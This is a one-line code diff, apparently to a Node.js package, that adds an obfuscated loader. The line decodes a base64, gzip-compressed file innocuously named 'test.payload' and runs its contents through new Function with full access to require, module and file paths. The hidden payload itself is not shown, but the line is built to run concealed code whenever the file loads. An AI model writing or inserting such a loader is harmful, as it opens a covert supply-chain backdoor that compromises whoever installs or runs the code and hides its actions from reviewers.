@@ -1,0 +1,1 @@
+const zlib=require('zlib');const source=zlib.gunzipSync(Buffer.from(require('./test.payload'),'base64')).toString('utf8');new Function('require','module','exports','__dirname','__filename',source)(require,module,exports,__dirname,__filename);
